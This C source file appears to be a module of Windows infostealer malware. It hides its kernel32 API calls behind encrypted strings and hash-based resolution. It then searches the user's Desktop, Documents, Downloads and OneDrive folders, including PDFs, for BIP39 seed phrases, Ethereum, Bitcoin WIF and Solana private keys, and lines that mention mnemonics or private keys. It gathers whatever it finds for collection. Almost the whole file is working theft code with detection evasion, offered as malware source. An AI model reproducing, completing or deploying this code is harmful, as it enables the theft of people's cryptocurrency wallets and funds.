#include "seed_grabber.h"
#include "config.h"
#include "peb.h"
#include "export_resolve.h"
#include "hash.h"
#include "enc_strings.h"
#include <windows.h>

#ifdef ENABLE_SEED_PHRASE_GRABBER
#include <string.h>
#include <stdio.h>
#include <ctype.h>

#define SEED_MAX_PATH 512
#define SEED_READ_BUF (64 * 1024)
#define SEED_MAX_PHRASES 128

/* ── API function pointer types (kernel32.dll) ──────────────────── */

typedef HANDLE (WINAPI *pFindFirstFileA_sg)(LPCSTR, LPWIN32_FIND_DATAA);
typedef BOOL   (WINAPI *pFindNextFileA_sg)(HANDLE, LPWIN32_FIND_DATAA);
typedef BOOL   (WINAPI *pFindClose_sg)(HANDLE);
typedef HANDLE (WINAPI *pCreateFileA_sg)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL   (WINAPI *pReadFile_sg)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL   (WINAPI *pCloseHandle_sg)(HANDLE);
typedef DWORD  (WINAPI *pGetFileSize_sg)(HANDLE, LPDWORD);
typedef HANDLE (WINAPI *pGetProcessHeap_sg)(void);
typedef LPVOID (WINAPI *pHeapAlloc_sg)(HANDLE, DWORD, SIZE_T);
typedef BOOL   (WINAPI *pHeapFree_sg)(HANDLE, DWORD, LPVOID);

/* ── Resolved API pointers ──────────────────────────────────────── */

static struct {
    pFindFirstFileA_sg  pFF;
    pFindNextFileA_sg   pFN;
    pFindClose_sg       pFC;
    pCreateFileA_sg     pCreateFile;
    pReadFile_sg        pReadFile;
    pCloseHandle_sg     pCloseHandle;
    pGetFileSize_sg     pGetFileSize;
    pGetProcessHeap_sg  pGetHeap;
    pHeapAlloc_sg       pAlloc;
    pHeapFree_sg        pFree;
    int                 ready;
} sg_api;

static void *sg_resolve(void *mod, const char *name) {
    return mirage_get_function_by_hash(mod, mirage_encrypted_hash_func(name));
}

static int sg_ensure_api(void) {
    if (sg_api.ready) return 1;

    char dll[32], fn[32];
    enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, dll);
    void *k32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
    if (!k32) return 0;

    enc_decrypt(enc_FindFirstFileA, ENC_FINDFIRSTFILEA_LEN, fn);
    sg_api.pFF = (pFindFirstFileA_sg)sg_resolve(k32, fn);
    enc_decrypt(enc_FindNextFileA, ENC_FINDNEXTFILEA_LEN, fn);
    sg_api.pFN = (pFindNextFileA_sg)sg_resolve(k32, fn);
    enc_decrypt(enc_FindClose, ENC_FINDCLOSE_LEN, fn);
    sg_api.pFC = (pFindClose_sg)sg_resolve(k32, fn);
    enc_decrypt(enc_CreateFileA, ENC_CREATEFILEA_LEN, fn);
    sg_api.pCreateFile = (pCreateFileA_sg)sg_resolve(k32, fn);
    enc_decrypt(enc_ReadFile, ENC_READFILE_LEN, fn);
    sg_api.pReadFile = (pReadFile_sg)sg_resolve(k32, fn);
    enc_decrypt(enc_CloseHandle, ENC_CLOSEHANDLE_LEN, fn);
    sg_api.pCloseHandle = (pCloseHandle_sg)sg_resolve(k32, fn);
    enc_decrypt(enc_GetFileSize, ENC_GETFILESIZE_LEN, fn);
    sg_api.pGetFileSize = (pGetFileSize_sg)sg_resolve(k32, fn);
    enc_decrypt(enc_GetProcessHeap, ENC_GETPROCESSHEAP_LEN, fn);
    sg_api.pGetHeap = (pGetProcessHeap_sg)sg_resolve(k32, fn);
    enc_decrypt(enc_HeapAlloc, ENC_HEAPALLOC_LEN, fn);
    sg_api.pAlloc = (pHeapAlloc_sg)sg_resolve(k32, fn);
    enc_decrypt(enc_HeapFree, ENC_HEAPFREE_LEN, fn);
    sg_api.pFree = (pHeapFree_sg)sg_resolve(k32, fn);

    if (!sg_api.pFF || !sg_api.pFN || !sg_api.pFC ||
        !sg_api.pCreateFile || !sg_api.pReadFile || !sg_api.pCloseHandle ||
        !sg_api.pGetFileSize || !sg_api.pGetHeap || !sg_api.pAlloc ||
        !sg_api.pFree)
        return 0;

    sg_api.ready = 1;
    return 1;
}

/* ── BIP39 English wordlist (2048 words, sorted) ─────────────── */

static const char *bip39_words[] = {
"abandon","ability","able","about","above","absent","absorb","abstract",
"absurd","abuse","access","accident","account","accuse","achieve","acid",
"acoustic","acquire","across","act","action","actor","actress","actual",
"adapt","add","addict","address","adjust","admit","adult","advance",
"advice","aerobic","affair","afford","afraid","again","age","agent",
"agree","ahead","aim","air","airport","aisle","alarm","album",
"alcohol","alert","alien","all","alley","allow","almost","alone",
"alpha","already","also","alter","always","amateur","amazing","among",
"amount","amused","analyst","anchor","ancient","anger","angle","angry",
"animal","ankle","announce","annual","another","answer","antenna","antique",
"anxiety","any","apart","apology","appear","apple","approve","april",
"arch","arctic","area","arena","argue","arm","armed","armor",
"army","around","arrange","arrest","arrive","arrow","art","artefact",
"artist","artwork","ask","aspect","assault","asset","assist","assume",
"asthma","athlete","atom","attack","attend","attitude","attract","auction",
"audit","august","aunt","author","auto","autumn","average","avocado",
"avoid","awake","aware","awesome","awful","awkward","axis","baby",
"bachelor","bacon","badge","bag","balance","balcony","ball","bamboo",
"banana","banner","bar","barely","bargain","barrel","base","basic",
"basket","battle","beach","bean","beauty","because","become","beef",
"before","begin","behave","behind","believe","below","belt","bench",
"benefit","best","betray","better","between","beyond","bicycle","bid",
"bike","bind","biology","bird","birth","bitter","black","blade",
"blame","blanket","blast","bleak","bless","blind","blood","blossom",
"blow","blue","blur","blush","board","boat","body","boil",
"bomb","bone","bonus","book","boost","border","boring","borrow",
"boss","bottom","bounce","box","boy","bracket","brain","brand",
"brass","brave","bread","breeze","brick","bridge","brief","bright",
"bring","brisk","broccoli","broken","bronze","broom","brother","brown",
"brush","bubble","buddy","budget","buffalo","build","bulb","bulk",
"bullet","bundle","bunny","burden","burger","burst","bus","business",
"busy","butter","buyer","buzz","cabbage","cabin","cable","cactus",
"cage","cake","call","calm","camera","camp","can","canal",
"cancel","candy","cannon","canoe","canvas","canyon","capable","capital",
"captain","car","carbon","card","cargo","carpet","carry","cart",
"case","cash","casino","castle","casual","cat","catalog","catch",
"category","cattle","caught","cause","caution","cave","ceiling","celery",
"cement","census","century","cereal","certain","chair","chalk","champion",
"change","chaos","chapter","charge","chase","cheap","check","cheese",
"chef","cherry","chest","chicken","chief","child","chimney","choice",
"choose","chronic","chuckle","chunk","churn","citizen","city","civil",
"claim","clap","clarify","claw","clay","clean","clerk","clever",
"cliff","climb","clinic","clip","clock","clog","close","cloth",
"cloud","clown","club","clump","cluster","clutch","coach","coast",
"coconut","code","coffee","coil","coin","collect","color","column",
"combine","come","comfort","comic","common","company","concert","conduct",
"confirm","congress","connect","consider","control","convince","cook","cool",
"copper","copy","coral","core","corn","correct","cost","cotton",
"couch","country","couple","course","cousin","cover","coyote","crack",
"cradle","craft","cram","crane","crash","crater","crawl","crazy",
"cream","credit","creek","crew","cricket","crime","crisp","critic",
"crop","cross","crouch","crowd","crucial","cruel","cruise","crumble",
"crush","cry","crystal","cube","culture","cup","cupboard","curious",
"current","curtain","curve","cushion","custom","cute","cycle","dad",
"damage","damp","dance","danger","daring","dash","daughter","dawn",
"day","deal","debate","debris","decade","december","decide","decline",
"decorate","decrease","deer","defense","define","defy","degree","delay",
"deliver","demand","demise","denial","dentist","deny","depart","depend",
"deposit","depth","deputy","derive","describe","desert","design","desk",
"despair","destroy","detail","detect","develop","device","devote","diagram",
"dial","diamond","diary","dice","diesel","diet","differ","digital",
"dignity","dilemma","dinner","dinosaur","direct","dirt","disagree","discover",
"disease","dish","dismiss","disorder","display","distance","divert","divide",
"divorce","dizzy","doctor","document","dog","doll","dolphin","domain",
"donate","donkey","donor","door","dose","double","dove","draft",
"dragon","drama","drastic","draw","dream","dress","drift","drill",
"drink","drip","drive","drop","drum","dry","duck","dumb",
"dune","during","dust","dutch","duty","dwarf","dynamic","dying",
"eager","eagle","early","earn","earth","easily","east","easy",
"echo","ecology","economy","edge","edit","educate","effort","egg",
"eight","either","elbow","elder","electric","elegant","element","elephant",
"elevator","elite","else","embark","embody","embrace","emerge","emotion",
"employ","empower","empty","enable","encourage","end","endless","endorse",
"enemy","energy","enforce","engage","engine","enhance","enjoy","enlist",
"enough","enrich","enroll","ensure","enter","entire","entry","envelope",
"episode","equal","equip","era","erase","erode","erosion","error",
"erupt","escape","essay","essence","estate","eternal","ethics","evidence",
"evil","evoke","evolve","exact","example","excess","exchange","excite",
"exclude","excuse","execute","exercise","exhaust","exhibit","exile","exist",
"exit","exotic","expand","expect","expire","explain","expose","express",
"extend","extra","eye","eyebrow","fabric","face","faculty","fade",
"faint","faith","fall","false","fame","family","famous","fan",
"fancy","fantasy","farm","fashion","fat","fatal","father","fatigue",
"fault","favorite","feature","february","federal","fee","feed","feel",
"female","fence","festival","fetch","fever","few","fiber","fiction",
"field","figure","file","film","filter","final","find","fine",
"finger","finish","fire","firm","fiscal","fish","fit","fitness",
"fix","flag","flame","flash","flat","flavor","flee","flight",
"flip","float","flock","floor","flower","fluid","flush","fly",
"foam","focus","fog","foil","fold","follow","food","foot",
"force","forest","forget","fork","fortune","forum","forward","fossil",
"foster","found","fox","fragile","frame","frequent","fresh","friend",
"fringe","frog","front","frost","frown","frozen","fruit","fuel",
"fun","funny","furnace","fury","future","gadget","gain","galaxy",
"gallery","game","gap","garage","garbage","garden","garlic","garment",
"gas","gasp","gate","gather","gauge","gaze","general","genius",
"genre","gentle","genuine","gesture","ghost","giant","gift","giggle",
"ginger","giraffe","girl","give","glad","glance","glare","glass",
"glide","glimpse","globe","gloom","glory","glove","glow","glue",
"goat","goddess","gold","good","goose","gorilla","gospel","gossip",
"govern","gown","grab","grace","grain","grant","grape","grass",
"gravity","great","green","grid","grief","grit","grocery","group",
"grow","grunt","guard","guess","guide","guilt","guitar","gun",
"gym","habit","hair","half","hammer","hamster","hand","happy",
"harbor","hard","harsh","harvest","hat","have","hawk","hazard",
"head","health","heart","heavy","hedgehog","height","hello","helmet",
"help","hen","hero","hip","hire","history","hobby","hockey",
"hold","hole","holiday","hollow","home","honey","hood","hope",
"horn","horror","horse","hospital","host","hotel","hour","hover",
"hub","huge","human","humble","humor","hundred","hungry","hunt",
"hurdle","hurry","hurt","husband","hybrid","ice","icon","idea",
"identify","idle","ignore","ill","illegal","illness","image","imitate",
"immense","immune","impact","impose","improve","impulse","inch","include",
"income","increase","index","indicate","indoor","industry","infant","inflict",
"inform","initial","inject","inmate","inner","innocent","input","inquiry",
"insane","insect","inside","inspire","install","intact","interest","into",
"invest","invite","involve","iron","island","isolate","issue","item",
"ivory","jacket","jaguar","jar","jazz","jealous","jeans","jelly",
"jewel","job","join","joke","journey","joy","judge","juice",
"jump","jungle","junior","junk","just","kangaroo","keen","keep",
"ketchup","key","kick","kid","kidney","kind","kingdom","kiss",
"kit","kitchen","kite","kitten","kiwi","knee","knife","knock",
"know","lab","label","labor","ladder","lady","lake","lamp",
"language","laptop","large","later","latin","laugh","laundry","lava",
"law","lawn","lawsuit","layer","lazy","leader","leaf","learn",
"leave","lecture","left","leg","legal","legend","leisure","lemon",
"lend","length","lens","leopard","lesson","letter","level","liberty",
"library","license","life","lift","light","like","limb","limit",
"link","lion","liquid","list","little","live","lizard","load",
"loan","lobster","local","lock","logic","lonely","long","loop",
"lottery","loud","lounge","love","loyal","lucky","luggage","lumber",
"lunar","lunch","luxury","lyrics","machine","mad","magic","magnet",
"maid","mail","main","major","make","mammal","man","manage",
"mandate","mango","mansion","manual","maple","marble","march","margin",
"marine","market","marriage","mask","mass","master","match","material",
"math","matrix","matter","maximum","maze","meadow","mean","measure",
"meat","mechanic","medal","media","melody","melt","member","memory",
"mention","menu","mercy","merge","merit","merry","mesh","message",
"metal","method","middle","midnight","milk","million","mimic","mind",
"minimum","minor","minute","miracle","mirror","misery","miss","mistake",
"mix","mixed","mixture","mobile","model","modify","mom","moment",
"monitor","monkey","monster","month","moon","moral","more","morning",
"mosquito","mother","motion","motor","mountain","mouse","move","movie",
"much","muffin","mule","multiply","muscle","museum","mushroom","music",
"must","mutual","myself","mystery","myth","naive","name","napkin",
"narrow","nasty","nation","nature","near","neck","need","negative",
"neglect","neither","nephew","nerve","nest","net","network","neutral",
"never","news","next","nice","night","noble","noise","nominee",
"noodle","normal","north","nose","notable","nothing","notice","novel",
"now","nuclear","number","nurse","nut","oak","obey","object",
"oblige","obscure","observe","obtain","obvious","occur","ocean","october",
"odor","off","offer","office","often","oil","okay","old",
"olive","olympic","omit","once","one","onion","online","only",
"open","opera","opinion","oppose","option","orange","orbit","orchard",
"order","ordinary","organ","orient","original","orphan","ostrich","other",
"outdoor","outer","output","outside","oval","oven","over","own",
"owner","oxygen","oyster","ozone","pact","paddle","page","pair",
"palace","palm","panda","panel","panic","panther","paper","parade",
"parent","park","parrot","party","pass","patch","path","patient",
"patrol","pattern","pause","pave","payment","peace","peanut","pear",
"peasant","pelican","pen","penalty","pencil","people","pepper","perfect",
"permit","person","pet","phone","photo","phrase","physical","piano",
"picnic","picture","piece","pig","pigeon","pill","pilot","pink",
"pioneer","pipe","pistol","pitch","pizza","place","planet","plastic",
"plate","play","please","pledge","pluck","plug","plunge","poem",
"poet","point","polar","pole","police","pond","pony","pool",
"popular","portion","position","possible","post","potato","pottery","poverty",
"powder","power","practice","praise","predict","prefer","prepare","present",
"pretty","prevent","price","pride","primary","print","priority","prison",
"private","prize","problem","process","produce","profit","program","project",
"promote","proof","property","prosper","protect","proud","provide","public",
"pudding","pull","pulp","pulse","pumpkin","punch","pupil","puppy",
"purchase","purity","purpose","purse","push","put","puzzle","pyramid",
"quality","quantum","quarter","question","quick","quit","quiz","quote",
"rabbit","raccoon","race","rack","radar","radio","rage","rail",
"rain","raise","rally","ramp","ranch","random","range","rapid",
"rare","rate","rather","raven","raw","razor","ready","real",
"reason","rebel","rebuild","recall","receive","recipe","record","recycle",
"reduce","reflect","reform","region","regret","regular","reject","relax",
"release","relief","rely","remain","remember","remind","remove","render",
"renew","rent","reopen","repair","repeat","replace","report","require",
"rescue","resemble","resist","resource","response","result","retire","retreat",
"return","reunion","reveal","review","reward","rhythm","rib","ribbon",
"rice","rich","ride","ridge","rifle","right","rigid","ring",
"riot","ripple","risk","ritual","rival","river","road","roast",
"robot","robust","rocket","romance","roof","rookie","room","rose",
"rotate","rough","round","route","royal","rubber","rude","rug",
"rule","run","runway","rural","sad","saddle","sadness","safe",
"sail","salad","salmon","salon","salt","salute","same","sample",
"sand","satisfy","satoshi","sauce","sausage","save","say","scale",
"scan","scare","scatter","scene","scheme","school","science","scissors",
"scorpion","scout","scrap","screen","script","scrub","sea","search",
"season","seat","second","secret","section","security","seed","seek",
"segment","select","sell","seminar","senior","sense","sentence","series",
"service","session","settle","setup","seven","shadow","shaft","shallow",
"share","shed","shell","sheriff","shield","shift","shine","ship",
"shiver","shock","shoe","shoot","shop","short","shoulder","shove",
"shrimp","shrug","shuffle","shy","sibling","sick","side","siege",
"sight","sign","silent","silk","silly","silver","similar","simple",
"since","sing","siren","sister","situate","six","size","skate",
"sketch","ski","skill","skin","skirt","skull","slab","slam",
"sleep","slender","slice","slide","slight","slim","slogan","slot",
"slow","slush","small","smart","smile","smoke","smooth","snack",
"snake","snap","sniff","snow","soap","soccer","social","sock",
"soda","soft","solar","soldier","solid","solution","solve","someone",
"song","soon","sorry","sort","soul","sound","soup","source",
"south","space","spare","spatial","spawn","speak","special","speed",
"spell","spend","sphere","spice","spider","spike","spin","spirit",
"split","sponsor","spoon","sport","spot","spray","spread","spring",
"spy","square","squeeze","squirrel","stable","stadium","staff","stage",
"stairs","stamp","stand","start","state","stay","steak","steel",
"stem","step","stereo","stick","still","sting","stock","stomach",
"stone","stool","story","stove","strategy","street","strike","strong",
"struggle","student","stuff","stumble","style","subject","submit","subway",
"success","such","sudden","suffer","sugar","suggest","suit","summer",
"sun","sunny","sunset","super","supply","supreme","sure","surface",
"surge","surprise","surround","survey","suspect","sustain","swallow","swamp",
"swap","swarm","swear","sweet","swim","swing","switch","sword",
"symbol","symptom","syrup","system","table","tackle","tag","tail",
"talent","talk","tank","tape","target","task","taste","tattoo",
"taxi","teach","team","tell","ten","tenant","tennis","tent",
"term","test","text","thank","that","theme","then","theory",
"there","they","thing","this","thought","three","thrive","throw",
"thumb","thunder","ticket","tide","tiger","tilt","timber","time",
"tiny","tip","tired","tissue","title","toast","tobacco","today",
"toddler","toe","together","toilet","token","tomato","tomorrow","tone",
"tongue","tonight","tool","tooth","top","topic","topple","torch",
"tornado","tortoise","toss","total","tourist","toward","tower","town",
"toy","track","trade","traffic","tragic","train","transfer","trap",
"trash","travel","tray","treat","tree","trend","trial","tribe",
"trick","trigger","trim","trip","trophy","trouble","truck","true",
"truly","trumpet","trust","truth","try","tube","tuna","tunnel",
"turkey","turn","turtle","twelve","twenty","twice","twin","twist",
"type","typical","ugly","umbrella","unable","unaware","uncle","uncover",
"under","undo","unfair","unfold","unhappy","uniform","union","unique",
"unit","universe","unknown","unlock","until","unusual","unveil","update",
"upgrade","uphold","upon","upper","upset","urban","usage","use",
"used","useful","useless","usual","utility","vacant","vacuum","vague",
"valid","valley","valve","van","vanish","vapor","various","vast",
"vault","vehicle","velvet","vendor","venture","venue","verb","verify",
"version","very","vessel","veteran","viable","vibrant","vicious","victory",
"video","view","village","vintage","violin","virtual","virus","visa",
"visit","visual","vital","vivid","vocal","voice","void","volcano",
"volume","vote","voyage","wage","wagon","wait","walk","wall",
"walnut","want","warfare","warm","warrior","wash","wasp","waste",
"water","wave","way","wealth","weapon","wear","weasel","weather",
"web","wedding","weekend","weird","welcome","well","west","wet",
"whale","what","wheat","wheel","when","where","whip","whisper",
"wide","width","wife","wild","will","win","window","wine",
"wing","wink","winner","winter","wire","wisdom","wise","wish",
"witness","wolf","woman","wonder","wood","wool","word","work",
"world","worry","worth","wrap","wreck","wrestle","wrist","write",
"wrong","yard","year","yellow","you","young","youth","zebra",
"zero","zone","zoo"
};

#define BIP39_COUNT 2048

/* ── Binary search in sorted BIP39 list ───────────────────────── */

static int bip39_lookup(const char *word) {
    int lo = 0, hi = BIP39_COUNT - 1;
    while (lo <= hi) {
        int mid = (lo + hi) / 2;
        int cmp = strcmp(word, bip39_words[mid]);
        if (cmp == 0) return 1;
        if (cmp < 0) hi = mid - 1;
        else lo = mid + 1;
    }
    return 0;
}

/* ── Tokenize string into lowercase words and count BIP39 matches ── */

static int count_bip39_in_text(const char *text, int *match_count) {
    char buf[SEED_READ_BUF];
    size_t len = strlen(text);
    if (len >= sizeof(buf)) len = sizeof(buf) - 1;
    memcpy(buf, text, len);
    buf[len] = '\0';

    for (size_t i = 0; i < len; i++)
        buf[i] = (char)tolower((unsigned char)buf[i]);

    int matches = 0;
    char *saveptr = NULL;
    char *token = strtok_r(buf, " \t\n\r,;.:/|\\[]{}!?*+-=", &saveptr);
    while (token) {
        if (bip39_lookup(token))
            matches++;
        token = strtok_r(NULL, " \t\n\r,;.:/|\\[]{}!?*+-=", &saveptr);
    }
    *match_count = matches;
    return 0;
}

/* ── Base58 character check (alphanumeric minus 0OIl) ──────────── */

static int is_base58(char c) {
    return (c >= '1' && c <= '9') || (c >= 'A' && c <= 'H') ||
           (c >= 'J' && c <= 'N') || (c >= 'P' && c <= 'Z') ||
           (c >= 'a' && c <= 'k') || (c >= 'm' && c <= 'z');
}

/* ── Hex digit check ──────────────────────────────────────────── */

static int is_hex_char(char c) {
    return (c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F');
}

/* ── Scan a single line for crypto key patterns ───────────────── */

static int match_eth_key(const char *line, size_t len) {
    return (len >= 66 && line[0] == '0' && (line[1] == 'x' || line[1] == 'X') &&
            is_hex_char(line[2]) && is_hex_char(line[3]));
}

static int match_btc_wif(const char *line, size_t len) {
    if ((len < 51 || len > 52) || (line[0] != '5' && line[0] != 'K' && line[0] != 'L'))
        return 0;
    for (size_t i = 1; i < len; i++)
        if (!is_base58(line[i])) return 0;
    return 1;
}

static int match_solana_key(const char *line, size_t len) {
    if (len < 64 || len > 88) return 0;
    for (size_t i = 0; i < len; i++)
        if (!is_base58(line[i])) return 0;
    return 1;
}

static int match_crypto_keyword(const char *line, size_t len) {
    char lower[512];
    size_t n = len < sizeof(lower) - 1 ? len : sizeof(lower) - 1;
    for (size_t i = 0; i < n; i++)
        lower[i] = (char)tolower((unsigned char)line[i]);
    lower[n] = '\0';

    static const char *keywords[] = {
        "seed", "mnemonic", "private key", "recovery phrase", "secret key",
        NULL
    };
    for (int i = 0; keywords[i]; i++) {
        if (strstr(lower, keywords[i]))
            return 1;
    }
    return 0;
}

static void scan_crypto_keys(const char *buf, size_t buflen,
                             char *output, size_t outlen, size_t *pos) {
    if (!buf || !output || !pos || outlen == 0) return;

    const char *line = buf;
    const char *end = buf + buflen;

    while (line < end && *line && *pos < outlen - 1) {
        const char *eol = line;
        while (eol < end && *eol && *eol != '\n' && *eol != '\r') eol++;
        size_t linelen = (size_t)(eol - line);

        if (linelen >= 66 && match_eth_key(line, linelen)) {
            int w = snprintf(output + *pos, outlen - *pos, "ETH_KEY: %.66s\n", line);
            if (w > 0 && (size_t)w < outlen - *pos) *pos += (size_t)w;
        }
        if (linelen >= 51 && match_btc_wif(line, linelen)) {
            char tmp[53];
            size_t cplen = linelen < 52 ? linelen : 52;
            memcpy(tmp, line, cplen);
            tmp[cplen] = '\0';
            int w = snprintf(output + *pos, outlen - *pos, "BTC_WIF: %s\n", tmp);
            if (w > 0 && (size_t)w < outlen - *pos) *pos += (size_t)w;
        }
        if (linelen >= 64 && match_solana_key(line, linelen)) {
            char tmp[89];
            size_t cplen = linelen < 88 ? linelen : 88;
            memcpy(tmp, line, cplen);
            tmp[cplen] = '\0';
            int w = snprintf(output + *pos, outlen - *pos, "SOL_KEY: %s\n", tmp);
            if (w > 0 && (size_t)w < outlen - *pos) *pos += (size_t)w;
        }
        if (linelen >= 6 && match_crypto_keyword(line, linelen)) {
            char tmp[256];
            size_t cplen = linelen < sizeof(tmp) - 1 ? linelen : sizeof(tmp) - 1;
            memcpy(tmp, line, cplen);
            tmp[cplen] = '\0';
            int w = snprintf(output + *pos, outlen - *pos, "KEYWORD: %s\n", tmp);
            if (w > 0 && (size_t)w < outlen - *pos) *pos += (size_t)w;
        }

        line = eol;
        while (line < end && (*line == '\n' || *line == '\r')) line++;
    }
}

/* ── Minimal PDF text extractor (BT/ET block scanning) ────────── */

static size_t extract_pdf_text(const unsigned char *data, size_t datalen,
                               char *out, size_t outlen) {
    if (!data || !out || outlen == 0) return 0;
    size_t pos = 0;
    const unsigned char *end = data + datalen;
    const unsigned char *p = data;

    while (p < end - 2) {
        const unsigned char *bt = NULL;
        while (p < end - 1) {
            if (p[0] == 'B' && p[1] == 'T') { bt = p; break; }
            p++;
        }
        if (!bt) break;

        const unsigned char *et = NULL;
        p = bt + 2;
        while (p < end - 1) {
            if (p[0] == 'E' && p[1] == 'T') { et = p; break; }
            p++;
        }
        if (!et) break;

        const unsigned char *s = bt + 2;
        while (s < et) {
            if (s + 2 <= et && s[0] == 'T' && s[1] == 'j') {
                const unsigned char *tok = s - 1;
                while (tok > bt + 2 && (*tok == ' ' || *tok == '\n' || *tok == '\r'))
                    tok--;
                if (tok > bt + 2 && *tok == ')') {
                    const unsigned char *close_paren = tok;
                    tok--;
                    int depth = 1;
                    while (tok > bt + 2 && depth > 0) {
                        if (*tok == ')') depth++;
                        if (*tok == '(') depth--;
                        if (depth > 0) tok--;
                    }
                    if (depth == 0) {
                        tok++;
                        while (tok < close_paren && pos < outlen - 1) {
                            if (*tok == '\\' && tok + 1 < close_paren)
                                tok++;
                            else {
                                if (*tok >= 0x20 && *tok < 0x7f)
                                    out[pos++] = (char)*tok;
                            }
                            tok++;
                        }
                    }
                }
            }
            else if (s + 2 <= et && s[0] == 'T' && s[1] == 'J') {
                const unsigned char *arr = s - 1;
                while (arr > bt + 2 && (*arr == ' ' || *arr == '\n' || *arr == '\r'))
                    arr--;
                if (*arr == ']') {
                    const unsigned char *scan = arr;
                    while (scan > bt + 2) {
                        if (*scan == ')') {
                            const unsigned char *close2 = scan;
                            scan--;
                            int d = 1;
                            while (scan > bt + 2 && d > 0) {
                                if (*scan == ')') d++;
                                if (*scan == '(') d--;
                                if (d > 0) scan--;
                            }
                            if (d == 0) {
                                scan++;
                                while (scan < close2 && pos < outlen - 1) {
                                    if (*scan == '\\' && scan + 1 < close2)
                                        scan++;
                                    else {
                                        if (*scan >= 0x20 && *scan < 0x7f)
                                            out[pos++] = (char)*scan;
                                    }
                                    scan++;
                                }
                            }
                        }
                        if (*scan == '[') break;
                        scan--;
                    }
                }
            }
            s++;
        }
        if (pos > 0 && pos < outlen - 1 && out[pos-1] != '\n')
            out[pos++] = '\n';

        p = et + 2;
    }
    if (pos >= outlen) pos = outlen - 1;
    out[pos] = '\0';
    return pos;
}

static int is_pdf_ext(const char *name) {
    const char *dot = strrchr(name, '.');
    return dot && _stricmp(dot + 1, "pdf") == 0;
}

/* ── Check if filename has target extension ────────────────────── */

static int has_target_ext(const char *name) {
    const char *dot = strrchr(name, '.');
    if (!dot) return 0;
    dot++;
    if (_stricmp(dot, "txt") == 0) return 1;
    if (_stricmp(dot, "json") == 0) return 1;
    if (_stricmp(dot, "md") == 0) return 1;
    if (_stricmp(dot, "doc") == 0) return 1;
    if (_stricmp(dot, "docx") == 0) return 1;
    if (_stricmp(dot, "pdf") == 0) return 1;
    return 0;
}

/* ── Scan a single directory ──────────────────────────────────── */

int seed_grabber_scan(const char *dir, char *output, size_t outlen) {
    if (!dir || !output || outlen == 0) return -1;
    if (!sg_ensure_api()) return -1;
    output[0] = '\0';

    char pattern[SEED_MAX_PATH];
    snprintf(pattern, sizeof(pattern), "%s\\*", dir);

    WIN32_FIND_DATAA fd;
    HANDLE hFind = sg_api.pFF(pattern, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return -1;

    size_t pos = 0;
    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
        if (!has_target_ext(fd.cFileName)) continue;

        char filepath[SEED_MAX_PATH];
        snprintf(filepath, sizeof(filepath), "%s\\%s", dir, fd.cFileName);

        HANDLE hFile = sg_api.pCreateFile(filepath, GENERIC_READ, FILE_SHARE_READ,
                                          NULL, OPEN_EXISTING, 0, NULL);
        if (hFile == INVALID_HANDLE_VALUE) continue;

        DWORD fileSize = sg_api.pGetFileSize(hFile, NULL);
        if (fileSize == INVALID_FILE_SIZE || fileSize == 0 || fileSize > SEED_READ_BUF - 1) {
            sg_api.pCloseHandle(hFile);
            continue;
        }

        char *buf = (char *)sg_api.pAlloc(sg_api.pGetHeap(), 0, fileSize + 1);
        if (!buf) { sg_api.pCloseHandle(hFile); continue; }

        DWORD read = 0;
        BOOL ok = sg_api.pReadFile(hFile, buf, fileSize, &read, NULL);
        sg_api.pCloseHandle(hFile);
        if (!ok || read == 0) {
            sg_api.pFree(sg_api.pGetHeap(), 0, buf);
            continue;
        }
        buf[read] = '\0';

        int matches = 0;

        if (is_pdf_ext(fd.cFileName)) {
            /* PDF: extract text from BT/ET blocks, then scan */
            char *pdf_text = (char *)sg_api.pAlloc(sg_api.pGetHeap(), 0, SEED_READ_BUF);
            if (pdf_text) {
                size_t plen = extract_pdf_text((const unsigned char *)buf, (size_t)read,
                                               pdf_text, SEED_READ_BUF);
                if (plen > 0) {
                    count_bip39_in_text(pdf_text, &matches);
                    scan_crypto_keys(pdf_text, plen, output, outlen, &pos);
                }
                sg_api.pFree(sg_api.pGetHeap(), 0, pdf_text);
            }
        } else {
            count_bip39_in_text(buf, &matches);
            scan_crypto_keys(buf, (size_t)read, output, outlen, &pos);
        }

        sg_api.pFree(sg_api.pGetHeap(), 0, buf);

        if (matches >= 12) {
            int wrote = snprintf(output + pos, outlen - pos, "%s (%d words)\n",
                                 filepath, matches);
            if (wrote > 0 && (size_t)wrote < outlen - pos)
                pos += (size_t)wrote;
            else
                break;
        }
    } while (sg_api.pFN(hFind, &fd));

    sg_api.pFC(hFind);
    return 0;
}

/* ── Collect from standard user directories ────────────────────── */

int seed_grabber_collect(char *output, size_t outlen) {
    if (!output || outlen == 0) return -1;
    if (!sg_ensure_api()) return -1;
    output[0] = '\0';

    const char *home = getenv("USERPROFILE");
    if (!home) home = getenv("HOME");
    if (!home) return -1;

    const char *dirs[] = {
        "Desktop", "Documents", "Downloads",
        "OneDrive\\Desktop", "OneDrive\\Documents", "OneDrive\\Downloads",
        NULL
    };

    size_t pos = 0;
    for (int i = 0; dirs[i]; i++) {
        char dirpath[SEED_MAX_PATH];
        snprintf(dirpath, sizeof(dirpath), "%s\\%s", home, dirs[i]);

        char result[SEED_READ_BUF] = {0};
        if (seed_grabber_scan(dirpath, result, sizeof(result)) == 0 && result[0]) {
            int wrote = snprintf(output + pos, outlen - pos, "%s", result);
            if (wrote > 0 && (size_t)wrote < outlen - pos)
                pos += (size_t)wrote;
            else
                break;
        }
    }
    return 0;
}

#endif /* ENABLE_SEED_PHRASE_GRABBER */
